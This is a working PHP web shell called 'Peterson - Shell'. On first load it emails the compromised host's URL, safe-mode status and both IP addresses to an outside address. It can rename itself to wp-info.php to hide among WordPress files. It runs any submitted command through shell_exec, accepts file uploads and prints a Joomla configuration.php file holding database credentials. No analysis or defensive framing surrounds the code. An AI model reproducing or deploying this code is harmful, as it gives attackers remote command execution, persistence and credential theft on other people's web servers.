<?php
@ini_restore("disable_functions");
if (!isset($_SESSION['bajak']))	{
$visitcount = 0;
$web = $_SERVER["HTTP_HOST"];
$inj = $_SERVER["REQUEST_URI"];
$body = "Shell Injector \n$web$inj";
$safem0de = @ini_get('safe_mode');
if (!$safem0de) {$security= "SAFE_MODE = OFF";}
else {$security= "SAFE_MODE = ON";};
$df='ini_get  disable!';
$serper=gethostbyname($_SERVER['SERVER_ADDR']);
$injektor = gethostbyname($_SERVER['REMOTE_ADDR']);
mail("peterdlegend@aol.com", "$body","Shell Result http://$web$inj\n$security\nIP Server = $serper\n IP Injector= $injektor");
$_SESSION['bajak'] = 0;
}
else {$_SESSION['bajak']++;};
if(isset($_GET['clone'])){
$source = $_SERVER['SCRIPT_FILENAME'];
$desti =$_SERVER['DOCUMENT_ROOT']."/wp-info.php";
rename($source, $desti);
}
$safem0de = @ini_get('safe_mode');
if (!$safem0de) {$security= "SAFE_MODE : OFF";}
else {$security= "SAFE_MODE : ON";}
echo "<title>Peterson - Shell</title><br><br>";
echo "<font size=2 color=#888888><b>".$security."</b><br>";
$cur_user="(".get_current_user().")";
echo "<font size=2 color=#888888><b>User : uid=".getmyuid().$cur_user." gid=".getmygid().$cur_user."</b><br>";
echo "<font size=2 color=#888888><b>Uname : ".php_uname()."</b><br>";
echo "<font size=2 color=#888888><b>Disable Functions : ";$df='ini_get  disable!';
if((@function_exists('ini_get')) && (''==($df=@ini_get('disable_functions')))){echo "NONE";}else{echo "$df";}
function pwd() {
$cwd = getcwd();
if($u=strrpos($cwd,'/')){
if($u!=strlen($cwd)-1){
return $cwd.'/';}
else{return $cwd;};
}
elseif($u=strrpos($cwd,'\\')){
if($u!=strlen($cwd)-1){
return $cwd.'\\';}
else{return $cwd;};
};
}
echo '<form method="POST" action=""><font size=2 color=#888888><b>Command</b><br><input type="text" name="cmd"><input type="Submit" name="command" value="cok"></form>';
echo '<form enctype="multipart/form-data" action method=POST><font size=2 color=#888888><b>Upload File</b></font><br><input type=hidden name="submit"><input type=file name="userfile" size=28><br><font size=2 color=#888888><b>New name: </b></font><input type=text size=15 name="newname" class=ta><input type=submit class="bt" value="Upload"></form>';
if(isset($_POST['submit'])){
$uploaddir = pwd();
if(!$name=$_POST['newname']){$name = $_FILES['userfile']['name'];};
move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir.$name);
if(move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir.$name)){
echo "Upload Failed";
} else { echo "Upload Success to ".$uploaddir.$name." :D "; }
}
if(isset($_POST['command'])){
$cmd = $_POST['cmd'];
echo "<pre><font size=3 color=#000000>".shell_exec($cmd)."</font></pre>";
}
else { echo "<pre><font size=3 color=#000000>".shell_exec('ls -la')."</font></pre>";
}

if(isset($_GET['baca'])){
$conf = file_get_contents("../../configuration.php");
echo $conf;
}
>